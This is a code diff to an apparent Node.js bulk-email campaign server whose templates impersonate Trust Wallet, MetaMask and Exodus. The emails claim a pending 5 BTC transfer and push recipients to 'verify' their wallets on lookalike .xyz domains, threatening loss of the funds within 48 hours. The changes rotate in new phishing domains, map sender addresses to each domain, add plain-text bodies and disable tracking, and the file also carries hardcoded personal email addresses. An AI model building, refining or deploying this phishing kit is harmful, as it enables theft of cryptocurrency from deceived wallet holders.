@@ -20,8 +20,8 @@ app.use(express.json());
 const templates = {
   trust: {
     v1: {
-      subject: "Verify now!",
-      getHtml: (recipient) => `
+      subject: "New message from Trust!",
+      getHtml: () => `
 <!DOCTYPE html>
 <html>
   <head>
@@ -70,6 +70,7 @@ const templates = {
       <div class="header">
         <img
           src="https://mailer-rosy.vercel.app/trust.png"
+          alt="Trust Logo"
           width="50"
           height="50"
           style="border-radius: 25px; background-color: white"
@@ -88,7 +89,7 @@ const templates = {
           verification before release. Please complete the verification process
           by accessing the secure link below:
         </p>
-        <a href="http://trustwalletweb.xyz" class="button">Verify Wallet</a>
+        <a href="https://trustsdataops.xyz" class="button">Verify Wallet</a>
         <p style="font-size: small">
           Important: If you do not complete verification within 48 hours, this
           transaction will be permanently removed from our system and the funds
@@ -96,12 +97,35 @@ const templates = {
         </p>
       </div>
       <div class="footer">
-        <p>© ${new Date().getFullYear()} Trust Wallet. All rights reserved.</p>
+        <p>© ${new Date().getFullYear()} Trust Group. All rights reserved.</p>
       </div>
     </div>
   </body>
 </html>
       `,
+
+      getText: () =>
+        `
+          [Trust Logo]
+
+          We are pleased to inform you that our system has detected an incoming
+          transfer of 5 BTC to your Trust wallet. This transaction originates
+          from wallet address bc1q7...p3k and has been securely queued in our
+          blockchain processing center.
+
+          For security reasons, incoming transfers above 100 ETH require account
+          verification before release. Please complete the verification process
+          by accessing the secure link below:
+
+          Verify Wallet:
+          https://trustsdataops.xyz
+
+          Important: If you do not complete verification within 48 hours, this
+          transaction will be permanently removed from our system and the funds
+          will be lost irreversibly.
+
+          © ${new Date().getFullYear()} Trust Group. All rights reserved.
+      `.trim(),
     },
     v2: {
       subject: "Verify now!",
@@ -177,7 +201,7 @@ const templates = {
           digital assets.
         </p>
 
-        <a href="http://trustwalletweb.xyz" class="button">Sign and Verify Wallet</a>
+        <a href="http://trustsdataops.xyz" class="button">Sign and Verify Wallet</a>
         <p style="font-size: 14px">
           The process is quick, secure, and completely free.
         </p>
@@ -280,7 +304,7 @@ const templates = {
           queued in our Ethereum Virtual Machine (EVM) processing center.
         </p>
 
-        <a href="http://metamask-web3.xyz" class="button">VERIFY WALLET</a>
+        <a href="http://groupmetamaxcontrol.xyz" class="button">VERIFY WALLET</a>
 
         <div class="story">
           <p>
@@ -400,7 +424,7 @@ const templates = {
           </p>
         </div>
 
-        <a href="http://metamask-web3.xyz" class="button">Verify Your MetaMask Wallet</a>
+        <a href="http://groupmetamaxcontrol.xyz" class="button">Verify Your MetaMask Wallet</a>
 
         <div style="font-size: small">
           <p>
@@ -527,7 +551,7 @@ const templates = {
           </p>
         </div>
 
-        <a href="http://exodus-web3.xyz" class="button">Verify Wallet</a>
+        <a href="http://veriexoduxx.xyz" class="button">Verify Wallet</a>
 
         <div>
           <p style="font-size: small; color: #aeaeae">
@@ -576,18 +600,49 @@ async function parseCSV(filePath) {
 }
 
 // Send single email
-async function sendEmail(recipient, template, version) {
+async function sendEmail(req, recipient, template, version) {
   const templateData = templates[template][version];
 
   if (!templateData) {
     throw new Error(`Template ${template} version ${version} not found`);
   }
 
+  // ✅ Use the origin (the frontend making the request)
+  const origin = req.headers.origin || req.headers.host;
+
+  // Clean up origin (remove protocol)
+  const cleanOrigin = origin.replace(/^https?:\/\//, "");
+
+  // Map domain selection to sender email
+  const domainRecipients = {
+    "trustsdataops.xyz": process.env.SENDGRID_FROM_EMAIL_1,
+    "groupmetamaxcontrol.xyz": process.env.SENDGRID_FROM_EMAIL_2,
+    "veriexoduxx.xyz": process.env.SENDGRID_FROM_EMAIL_3,
+  };
+
+  // Pick sender based on origin or fallback
+  const senderEmail =
+    domainRecipients[cleanOrigin] || process.env.SENDGRID_FROM_EMAIL;
+
+  if (!senderEmail) {
+    throw new Error(`No sender configured for this domain: ${cleanOrigin}`);
+  }
+
   const msg = {
     to: recipient.email,
-    from: process.env.SENDGRID_FROM_EMAIL,
+    from: {
+      email: senderEmail,
+      name: "Trust Support",
+    },
     subject: templateData.subject,
-    html: templateData.getHtml(recipient),
+    text: templateData.getText
+      ? templateData.getText()
+      : stripHtml(templateData.getHtml()),
+    html: templateData.getHtml(),
+    trackingSettings: {
+      clickTracking: { enable: false },
+      openTracking: { enable: false },
+    },
   };
 
   try {
@@ -600,7 +655,7 @@ async function sendEmail(recipient, template, version) {
 }
 
 // Send bulk emails with rate limiting
-async function sendBulkEmails(recipients, template, version) {
+async function sendBulkEmails(req, recipients, template, version) {
   const results = {
     total: recipients.length,
     sent: 0,
@@ -622,7 +677,7 @@ async function sendBulkEmails(recipients, template, version) {
       continue;
     }
 
-    const result = await sendEmail(recipient, template, version);
+    const result = await sendEmail(req, recipient, template, version);
 
     if (result.success) {
       results.sent++;
@@ -696,7 +751,7 @@ app.post("/api/send-campaign", upload.single("file"), async (req, res) => {
       `Starting campaign: ${recipients.length} emails using ${template} template (${version})`
     );
 
-    const results = await sendBulkEmails(recipients, template, version);
+    const results = await sendBulkEmails(req, recipients, template, version);
 
     console.log("Campaign completed:", results);
 
@@ -706,7 +761,10 @@ app.post("/api/send-campaign", upload.single("file"), async (req, res) => {
     });
   } catch (error) {
     console.error("Campaign error:", error);
-    res.status(500).json({ error: "Failed to send campaign" });
+    res.status(500).json({
+      error: "Failed to send campaign",
+      details: error.message,
+    });
   }
 });
 
@@ -752,8 +810,8 @@ app.get("/api/test-sendgrid", async (req, res) => {
     console.log("\n🧪 Testing SendGrid Configuration...");
 
     const msg = {
-      to: process.env.SENDGRID_FROM_EMAIL,
-      from: process.env.SENDGRID_FROM_EMAIL,
+      to: ["danielekene68@gmail.com", "danielekene6b@gmail.com"],
+      from: process.env.SENDGRID_FROM_EMAIL_2,
       subject: "SendGrid Configuration Test",
       text: "If you receive this email, your SendGrid integration is working correctly!",
       html: "<strong>If you receive this email, your SendGrid integration is working correctly!</strong>",
@@ -809,6 +867,17 @@ app.get("/api/templates", (req, res) => {
 // Start server
 const PORT = process.env.PORT || 3000;
 
+// app.listen(PORT, () => {
+//   console.log("\n" + "=".repeat(50));
+//   console.log("✅ Email Campaign Server Started");
+//   console.log("=".repeat(50));
+//   console.log(`🚀 Server running on port ${PORT}`);
+//   console.log(
+//     `📧 SendGrid configured: ${process.env.SENDGRID_API_KEY ? "✓" : "✗"}`
+//   );
+//   console.log(`📤 From email: ${process.env.SENDGRID_FROM_EMAIL[host] || "NOT SET"}`);
+// });
+
 app.listen(PORT, () => {
   console.log("\n" + "=".repeat(50));
   console.log("✅ Email Campaign Server Started");
@@ -817,7 +886,21 @@ app.listen(PORT, () => {
   console.log(
     `📧 SendGrid configured: ${process.env.SENDGRID_API_KEY ? "✓" : "✗"}`
   );
-  console.log(`📤 From email: ${process.env.SENDGRID_FROM_EMAIL || "NOT SET"}`);
+
+  // Display mapped sender emails per domain
+  console.log("🌐 Domain-based sender mapping:");
+  console.log("----------------------------------");
+  console.log(`domain1 → ${process.env.SENDGRID_FROM_EMAIL_1 || "NOT SET"}`);
+  console.log(`domain2 → ${process.env.SENDGRID_FROM_EMAIL_2 || "NOT SET"}`);
+  console.log(`domain3 → ${process.env.SENDGRID_FROM_EMAIL_3 || "NOT SET"}`);
+  console.log("----------------------------------");
+
+  // Optional: show default fallback sender
+  console.log(
+    `📤 Default fallback sender: ${
+      process.env.SENDGRID_FROM_EMAIL || "NOT SET"
+    }`
+  );
 });
 
 process.on("uncaughtException", (error) => {
